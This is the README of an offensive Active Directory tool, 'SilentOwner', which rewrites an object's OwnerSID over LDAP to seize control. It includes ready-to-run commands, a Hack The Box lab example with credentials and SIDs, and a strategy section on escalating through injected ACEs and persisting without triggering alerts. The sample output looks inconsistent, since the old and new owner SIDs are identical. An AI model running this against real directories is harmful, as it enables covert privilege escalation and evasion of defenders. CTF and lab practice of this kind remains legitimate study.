# 🛡️ SilentOwner — Replace LDAP OwnerSID via WriteOwner without touching ACEs  
🧬 Built for post-exploitation, stealth privilege escalation, and AD persistence

**SilentOwner** is a stealthy LDAP post-exploitation tool that lets you **change the OwnerSID** of any Active Directory object — such as a user or group — when your account holds **WriteOwner** permissions.

It operates entirely over LDAP using the correct `SDFlags` control to modify the `nTSecurityDescriptor` attribute.  
This enables you to **silently assume ownership**, gain **implicit control**, and prepare **privilege escalation paths** — without needing a shell or triggering alerts.

---

## 🔧 Requirements

- Python 3.10+
- [`ldap3`](https://pypi.org/project/ldap3/)
- [`impacket`](https://github.com/SecureAuthCorp/impacket)

Install with:

```bash
pip install -r requirements.txt
```

---

## 🚀 Basic Syntax

```bash
python3 SilentOwner.py \
  --dc-ip <DC_IP> \
  -u <USERNAME> \
  -p '<PASSWORD>' \
  --domain <DOMAIN> \
  --target-dn '<DISTINGUISHED_NAME>' \
  --new-owner-sid '<NEW_OWNER_SID>'
```

- `--target-dn`: Full DN of the target object (e.g., group, user)  
- `--new-owner-sid`: SID to assign as new owner (usually your own)

<details>
<summary>📦 Certified (HTB)<Windows>

```bash
python3 SilentOwner.py \
  --dc-ip 10.129.128.69 \
  -u judith.mader@certified.htb \
  -p 'judith09' \
  --domain certified.htb \
  --target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' \
  --new-owner-sid 'S-1-5-21-729746778-2675978091-3820388244-1103'
```
</details>

---

## 📤 Example Output

```text
🛡️ SilentOwner is live — scanning for target object ownership...

[+] LDAP bind successful.
[DEBUG] Raw sd['OwnerSid']: b'\x01\x00\x00\x8c\x14\x00\x00\x00\x00\x00\x0'
[+] Current owner: S-1-5-21-729746778-2675978091-3820388244-1103
[+] Replacing owner with: S-1-5-21-729746778-2675978091-3820388244-1103
[✅] Ownership of CN=Management,CN=Users,DC=certified,DC=htb successfully changed to S-1-5-21-729746778-2675978091-3820388244-1103
```

---

## 🧩 Usage Strategy

SilentOwner is most effective when combined with tools like:

### 🔍 Certipy-ACL
- Use `certipy acl` to discover objects where your user has **WriteOwner**
- Filter by your own SID to isolate takeover targets

### 🧠 SID Mapping
- Extract SIDs from LDAP using `ldapsearch` or custom tools
- Use your user SID as the new owner in takeover

### ⚙️ Post-Takeover
- After becoming owner, you can inject ACEs (e.g., `GenericAll`, `WriteDACL`) using other tools
- Consider persistence strategies that don’t trigger alerts

🧬 *SilentOwner is for the stealthy step — not for noisy privilege assignments. Combine it with follow-up tools.*

---

## ⚠️ Warning

Replacing the OwnerSID of LDAP objects is a powerful action.  
Done incorrectly, it can:

- Break delegation chains
- Affect replication metadata
- Leave subtle traces for defenders

Always test in a lab before using in real-world scenarios.

---

## 📄 License

MIT License

SilentOwner is based on live LDAP modification techniques, using `ldap3` and `impacket` to operate without touching ACEs.  
Authored with ❤️ by [xploitnik](https://github.com/xploitnik).




